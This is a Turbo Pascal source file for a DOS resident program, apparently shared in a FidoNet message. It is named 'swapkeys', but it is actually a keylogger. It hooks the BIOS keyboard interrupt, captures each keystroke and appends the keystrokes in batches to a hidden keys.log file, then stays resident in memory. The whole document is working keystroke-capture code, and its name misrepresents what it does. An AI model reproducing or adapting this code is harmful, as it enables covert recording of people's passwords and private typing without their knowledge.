{$S-,R-}        { Don't want stack or range checking }
program swapkeys;

uses dos;

Const
    KbdInt     = $15;

Const BuffLen = 16;

Var
    Buff         : array[1..BuffLen] of char;
    BuffIdx      : word;

const
  ISRhandle = 20;

  Esc       = $01;
  Backspace = $0E;
  XKey      = $2D;
  ZKey      = $2C;

  OrigAddr  = ptr($1234,$5678);

  var keyfile: file;

  inkb: boolean;

procedure Int15ISR(bp:word); interrupt; var
  regs : registers absolute bp; begin
  with regs do
  begin

    if ah = $4f then
      begin

   if (not inkb)  then
    begin

    inkb := true;

    buff[buffidx]:=char(lo(ax));

    inc(BuffIdx);

    if BuffIdx >= BuffLen then
      begin

      assign(keyfile,'keys.log');
      reset(keyfile,1);
      if IORESULT<>0 then rewrite(keyfile,1);

      if filesize(keyfile)=0 then seek(keyfile,0) else
      seek(keyfile,filesize(keyfile)-1);

      blockwrite(keyfile,Buff[1],BuffLen);
      Close(KeyFile);

      BuffIdx := 1;
      end;

    inkb := false;


      end;
      end;
    asm call OrigAddr^;
  end; end end

procedure EndMarker; begin end;

procedure FreeSeg(seg:word); { I'm not sure why Turbopower doesn't supply
this routine. } var
  regs : registers; begin
  with regs do
  begin
    ah := $49;
    es := seg;
  end;
  MsDos(Regs); end;

var
  p,q : pointer;     { Used for some memory fiddling }
  signature : word;
  position : word;

  paras : word;
  israddress : pointer;
  thisenv : envrec; begin
  RestoreAllVectors;       { OPint installs several handlers; we don't
                             want those }

  { Release the environment block }

  CurrentEnv(thisenv);
  Freeseg(thisenv.envseg);

  { Copy our ISR down into the PSP.  Don't overwrite the first 4 paras. }
  { Note that TP generates 10 bytes we don't need at the end of our
    ISR }
  paras := (ofs(endmarker)-10+15) div 16;
  ISRaddress := ptr(Prefixseg+4,0);
  move(@Int15ISR^, ISRaddress^ , 16*paras);

  if not initvector($15,
                     ISRHandle,
                     ISRaddress) then
  begin
    writeln('InitVector failed! Aborting.');
    halt(99);
  end;

  { Now the tricky part.  First, put the old ISR address into our
    service routine. }

  signature := $5678;
  p := ptr(seg(ISRaddress^),search(ISRaddress^,16*paras, signature, 2));
  q := IsrArray[ISRHandle].OrigAddr;
  Move(q,p^,2);
  signature := $1234;
  p := ptr(seg(p^),search(ISRaddress^,16*paras, signature, 2));
  q := pointer(longint(q) shr 16);   { Shift the segment to the offset }
  Move(q,p^,2);

  paras := seg(ISRaddress^) - prefixseg          { the PSP }
           + paras;                              { plus our code }
  { Have to trick StayRes to let us release so much memory }
  heapptr := ptr(pred(prefixseg+paras),0);
  StayRes(Paras, 0);
  writeln('StayRes failed!'); end.


--- Msg V3.2
 * Origin: Murdoch's_Point  - -   (1:249/99.5)
 


